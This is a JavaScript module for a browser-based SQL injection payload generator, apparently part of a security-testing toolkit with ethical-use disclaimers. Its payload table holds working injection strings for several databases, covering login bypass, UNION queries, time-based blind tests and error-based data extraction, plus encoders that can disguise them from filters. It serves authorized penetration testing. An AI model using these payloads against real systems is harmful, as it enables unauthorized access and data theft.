/**
 * SQL Injection Payload Encoder
 * Generate and encode SQL injection payloads for security testing
 * 
 * ⚠️ ETHICAL USE ONLY: This tool is for authorized security testing only.
 * Unauthorized use may be illegal. Always obtain proper authorization.
 */

import { utils } from './main.js';

export function render(container) {
    container.innerHTML = `
        <div class="tool-header">
            <h1 class="tool-title">SQLi Payload Encoder</h1>
            
            <div class="alert alert-danger" style="border: 2px solid #dc3545;">
                <h3 style="margin-top: 0;">⚠️ ETHICAL USE DISCLAIMER</h3>
                <p><strong>This tool is intended for AUTHORIZED security testing only.</strong></p>
                <ul style="margin: 10px 0;">
                    <li>Only use on systems you own or have explicit written permission to test</li>
                    <li>Unauthorized access to computer systems is illegal in most jurisdictions</li>
                    <li>You are solely responsible for how you use these payloads</li>
                    <li>The developers of this tool assume no liability for misuse</li>
                </ul>
                <p>By using this tool, you acknowledge that you will use it responsibly and legally.</p>
            </div>

            <p class="tool-description">
                Generate SQL injection test payloads with various encoding schemes for 
                penetration testing and security assessments.
            </p>

            <div class="form-group">
                <label for="payloadType"><strong>Payload Type:</strong></label>
                <select id="payloadType" class="form-control">
                    <optgroup label="Authentication Bypass">
                        <option value="auth-or">OR-based Authentication Bypass</option>
                        <option value="auth-comment">Comment-based Bypass</option>
                        <option value="auth-admin">Admin Bypass</option>
                    </optgroup>
                    <optgroup label="Union-based">
                        <option value="union-basic">UNION SELECT (Basic)</option>
                        <option value="union-columns">UNION Column Discovery</option>
                    </optgroup>
                    <optgroup label="Boolean-based">
                        <option value="bool-and">AND Boolean Test</option>
                        <option value="bool-or">OR Boolean Test</option>
                    </optgroup>
                    <optgroup label="Time-based">
                        <option value="time-sleep">Time Delay (SLEEP)</option>
                        <option value="time-benchmark">BENCHMARK</option>
                    </optgroup>
                    <optgroup label="Error-based">
                        <option value="error-extract">Error-based Extraction</option>
                    </optgroup>
                    <optgroup label="Other">
                        <option value="stacked">Stacked Queries</option>
                        <option value="custom">Custom Payload</option>
                    </optgroup>
                </select>
            </div>

            <div id="customPayloadSection" style="display: none;" class="form-group">
                <label for="customPayload"><strong>Custom SQL Payload:</strong></label>
                <textarea 
                    id="customPayload" 
                    class="form-control" 
                    rows="3"
                    placeholder="Enter your custom SQL injection payload..."
                ></textarea>
            </div>

            <div class="form-group">
                <label for="dbType"><strong>Database Type:</strong></label>
                <select id="dbType" class="form-control">
                    <option value="generic">Generic SQL</option>
                    <option value="mysql">MySQL / MariaDB</option>
                    <option value="postgresql">PostgreSQL</option>
                    <option value="mssql">Microsoft SQL Server</option>
                    <option value="oracle">Oracle</option>
                    <option value="sqlite">SQLite</option>
                </select>
            </div>

            <div class="form-group">
                <label><strong>Encoding Options:</strong></label>
                <div>
                    <label><input type="checkbox" id="encodeUrl"> URL Encoding</label><br>
                    <label><input type="checkbox" id="encodeDouble"> Double URL Encoding</label><br>
                    <label><input type="checkbox" id="encodeHex"> Hex Encoding</label><br>
                    <label><input type="checkbox" id="encodeChar"> CHAR() Encoding</label><br>
                    <label><input type="checkbox" id="encodeUnicode"> Unicode Encoding</label><br>
                </div>
            </div>

            <button id="generateBtn" class="btn btn-primary">Generate Payload</button>
            <button id="clearBtn" class="btn btn-danger">Clear</button>

            <div id="payloadOutput" style="display: none; margin-top: 20px;">
                <h3>Generated Payload</h3>
                <div class="output-section">
                    <label><strong>Plain:</strong></label>
                    <textarea id="plainPayload" class="form-control" rows="3" readonly></textarea>
                    <button id="copyPlainBtn" class="btn btn-sm">Copy</button>
                </div>

                <div id="encodedPayloads" style="margin-top: 15px;">
                    <!-- Encoded versions populated here -->
                </div>
            </div>

            <div id="payloadInfo" style="display: none; margin-top: 20px;">
                <h3>Payload Information</h3>
                <div id="payloadDescription" class="output-section">
                    <!-- Payload description -->
                </div>
            </div>

            <div class="alert alert-info" style="margin-top: 30px;">
                <h4>Testing Best Practices:</h4>
                <ul style="margin: 10px 0 0 0;">
                    <li>Always test in a controlled, authorized environment</li>
                    <li>Document all testing activities and findings</li>
                    <li>Start with least invasive tests (boolean-based)</li>
                    <li>Use time-based tests cautiously (can cause load)</li>
                    <li>Never modify or delete production data</li>
                    <li>Report vulnerabilities responsibly</li>
                </ul>
            </div>

            <div style="margin-top: 20px;">
                <h4>Recommended Resources:</h4>
                <ul>
                    <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger SQL Injection Guide</a></li>
                    <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection</a></li>
                    <li><a href="https://github.com/payloadbox/sql-injection-payload-list" target="_blank">PayloadBox SQLi List</a></li>
                </ul>
            </div>
    `;

    // Elements
    const payloadType = container.querySelector('#payloadType');
    const dbType = container.querySelector('#dbType');
    const customPayloadSection = container.querySelector('#customPayloadSection');
    const customPayload = container.querySelector('#customPayload');
    
    const encodeUrl = container.querySelector('#encodeUrl');
    const encodeDouble = container.querySelector('#encodeDouble');
    const encodeHex = container.querySelector('#encodeHex');
    const encodeChar = container.querySelector('#encodeChar');
    const encodeUnicode = container.querySelector('#encodeUnicode');

    const generateBtn = container.querySelector('#generateBtn');
    const clearBtn = container.querySelector('#clearBtn');
    
    const payloadOutput = container.querySelector('#payloadOutput');
    const plainPayload = container.querySelector('#plainPayload');
    const encodedPayloads = container.querySelector('#encodedPayloads');
    const payloadInfo = container.querySelector('#payloadInfo');
    const payloadDescription = container.querySelector('#payloadDescription');

    // Show/hide custom payload section
    payloadType.addEventListener('change', () => {
        if (payloadType.value === 'custom') {
            customPayloadSection.style.display = 'block';
        } else {
            customPayloadSection.style.display = 'none';
        }
    });

    // Generate payload
    generateBtn.addEventListener('click', () => {
        const type = payloadType.value;
        const db = dbType.value;
        
        let payload;
        let description;

        if (type === 'custom') {
            payload = customPayload.value.trim();
            description = 'Custom SQL payload';
            if (!payload) {
                alert('Please enter a custom payload');
                return;
            }
        } else {
            const result = generatePayload(type, db);
            payload = result.payload;
            description = result.description;
        }

        displayPayload(payload, description);
        applyEncodings(payload);
    });

    clearBtn.addEventListener('click', () => {
        customPayload.value = '';
        payloadOutput.style.display = 'none';
        payloadInfo.style.display = 'none';
        encodeUrl.checked = false;
        encodeDouble.checked = false;
        encodeHex.checked = false;
        encodeChar.checked = false;
        encodeUnicode.checked = false;
    });

    container.querySelector('#copyPlainBtn').addEventListener('click', async () => {
        const btn = container.querySelector('#copyPlainBtn');
        try {
            await navigator.clipboard.writeText(plainPayload.value);
            btn.textContent = 'Copied!';
            setTimeout(() => btn.textContent = 'Copy', 2000);
        } catch (err) {
            alert('Failed to copy');
        }
    });

    // Add copy/paste buttons to textarea
    setTimeout(() => {
        utils.addTextareaActions(customPayload, {
            showCopy: true,
            showPaste: true
        });

        // Make disclaimer collapsible
        utils.initAllCollapsibles(container);
    }, 100);

    // Payload generation
    function generatePayload(type, db) {
        const payloads = {
            'auth-or': {
                generic: "' OR '1'='1",
                mysql: "' OR '1'='1' -- ",
                postgresql: "' OR '1'='1' --",
                mssql: "' OR '1'='1' --",
                oracle: "' OR '1'='1' --",
                sqlite: "' OR '1'='1' --",
                description: "OR-based authentication bypass. Attempts to make the WHERE clause always true."
            },
            'auth-comment': {
                generic: "admin'--",
                mysql: "admin'-- ",
                postgresql: "admin'--",
                mssql: "admin'--",
                oracle: "admin'--",
                sqlite: "admin'--",
                description: "Comment-based bypass. Comments out the rest of the query (password check)."
            },
            'auth-admin': {
                generic: "admin'/*",
                mysql: "' OR username='admin'-- ",
                postgresql: "' OR username='admin'--",
                mssql: "' OR username='admin'--",
                oracle: "' OR username='admin'--",
                sqlite: "' OR username='admin'--",
                description: "Admin bypass. Attempts to authenticate as admin user."
            },
            'union-basic': {
                generic: "' UNION SELECT NULL--",
                mysql: "' UNION SELECT NULL,NULL,NULL-- ",
                postgresql: "' UNION SELECT NULL,NULL,NULL--",
                mssql: "' UNION SELECT NULL,NULL,NULL--",
                oracle: "' UNION SELECT NULL,NULL,NULL FROM DUAL--",
                sqlite: "' UNION SELECT NULL,NULL,NULL--",
                description: "Basic UNION SELECT. Used to retrieve data from other tables. Adjust NULL count based on column count."
            },
            'union-columns': {
                generic: "' ORDER BY 1--",
                mysql: "' ORDER BY 1-- ",
                postgresql: "' ORDER BY 1--",
                mssql: "' ORDER BY 1--",
                oracle: "' ORDER BY 1--",
                sqlite: "' ORDER BY 1--",
                description: "Column count discovery using ORDER BY. Increment the number until error occurs."
            },
            'bool-and': {
                generic: "' AND '1'='1",
                mysql: "' AND '1'='1'-- ",
                postgresql: "' AND '1'='1'--",
                mssql: "' AND '1'='1'--",
                oracle: "' AND '1'='1'--",
                sqlite: "' AND '1'='1'--",
                description: "AND-based boolean test. Tests if injection point is vulnerable (should return normal result)."
            },
            'bool-or': {
                generic: "' OR '1'='2",
                mysql: "' OR '1'='2'-- ",
                postgresql: "' OR '1'='2'--",
                mssql: "' OR '1'='2'--",
                oracle: "' OR '1'='2'--",
                sqlite: "' OR '1'='2'--",
                description: "OR-based boolean test. False condition (should return no results)."
            },
            'time-sleep': {
                generic: "'; WAITFOR DELAY '00:00:05'--",
                mysql: "' AND SLEEP(5)-- ",
                postgresql: "' AND pg_sleep(5)--",
                mssql: "'; WAITFOR DELAY '00:00:05'--",
                oracle: "' AND DBMS_LOCK.SLEEP(5)--",
                sqlite: "' AND (SELECT 1 FROM (SELECT SLEEP(5))s)--",
                description: "Time-based blind injection. Causes database to delay response by 5 seconds."
            },
            'time-benchmark': {
                generic: "' AND BENCHMARK(5000000,MD5('test'))--",
                mysql: "' AND BENCHMARK(5000000,MD5('test'))-- ",
                postgresql: "' AND (SELECT COUNT(*) FROM generate_series(1,5000000))>0--",
                mssql: "'; WAITFOR DELAY '00:00:05'--",
                oracle: "' AND (SELECT COUNT(*) FROM ALL_OBJECTS,ALL_OBJECTS)>0--",
                sqlite: "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2))>0--",
                description: "BENCHMARK-based time delay. Alternative to SLEEP functions."
            },
            'error-extract': {
                generic: "' AND 1=CONVERT(int,(SELECT @@version))--",
                mysql: "' AND extractvalue(1,concat(0x7e,database()))-- ",
                postgresql: "' AND CAST((SELECT version()) AS int)--",
                mssql: "' AND 1=CONVERT(int,(SELECT @@version))--",
                oracle: "' AND UTL_INADDR.get_host_name((SELECT user FROM dual))=1--",
                sqlite: "' AND CAST((SELECT sqlite_version()) AS int)--",
                description: "Error-based data extraction. Forces database to return data in error message."
            },
            'stacked': {
                generic: "'; SELECT 1--",
                mysql: "'; SELECT SLEEP(5)-- ",
                postgresql: "'; SELECT pg_sleep(5)--",
                mssql: "'; SELECT 1--",
                oracle: "'; SELECT 1 FROM DUAL--",
                sqlite: "'; SELECT 1--",
                description: "Stacked queries. Executes multiple SQL statements. May not work on all platforms."
            }
        };

        const payloadData = payloads[type];
        if (!payloadData) {
            return { payload: '', description: '' };
        }

        const payload = payloadData[db] || payloadData.generic;
        const description = payloadData.description;

        return { payload, description };
    }

    function displayPayload(payload, description) {
        plainPayload.value = payload;
        payloadDescription.innerHTML = `<p>${escapeHtml(description)}</p>`;
        payloadOutput.style.display = 'block';
        payloadInfo.style.display = 'block';
    }

    function applyEncodings(payload) {
        let html = '';

        if (encodeUrl.checked) {
            const encoded = encodeURIComponent(payload);
            html += createEncodedSection('URL Encoded', encoded);
        }

        if (encodeDouble.checked) {
            const encoded = encodeURIComponent(encodeURIComponent(payload));
            html += createEncodedSection('Double URL Encoded', encoded);
        }

        if (encodeHex.checked) {
            const encoded = '0x' + Array.from(payload).map(c => 
                c.charCodeAt(0).toString(16).padStart(2, '0')
            ).join('');
            html += createEncodedSection('Hex Encoded', encoded);
        }

        if (encodeChar.checked) {
            const encoded = 'CHAR(' + Array.from(payload).map(c => 
                c.charCodeAt(0)
            ).join(',') + ')';
            html += createEncodedSection('CHAR() Encoded', encoded);
        }

        if (encodeUnicode.checked) {
            const encoded = Array.from(payload).map(c => 
                '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
            ).join('');
            html += createEncodedSection('Unicode Encoded', encoded);
        }

        if (html === '') {
            html = '<p style="color: #999;">Select encoding options to see encoded versions</p>';
        }

        encodedPayloads.innerHTML = html;
    }

    function createEncodedSection(title, encoded) {
        const id = 'encoded_' + Math.random().toString(36).substring(7);
        return `
            <div class="output-section" style="margin-top: 10px;">
                <label><strong>${escapeHtml(title)}:</strong></label>
                <textarea id="${id}" class="form-control" rows="3" readonly>${escapeHtml(encoded)}</textarea>
                <button class="btn btn-sm copy-encoded-btn" data-target="${id}">Copy</button>
            </div>
        `;
    }

    // Event delegation for copy buttons
    encodedPayloads.addEventListener('click', async (e) => {
        if (e.target.classList.contains('copy-encoded-btn')) {
            const targetId = e.target.getAttribute('data-target');
            const textarea = container.querySelector('#' + targetId);
            
            try {
                await navigator.clipboard.writeText(textarea.value);
                e.target.textContent = 'Copied!';
                setTimeout(() => e.target.textContent = 'Copy', 2000);
            } catch (err) {
                alert('Failed to copy');
            }
        }
    });

    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
}
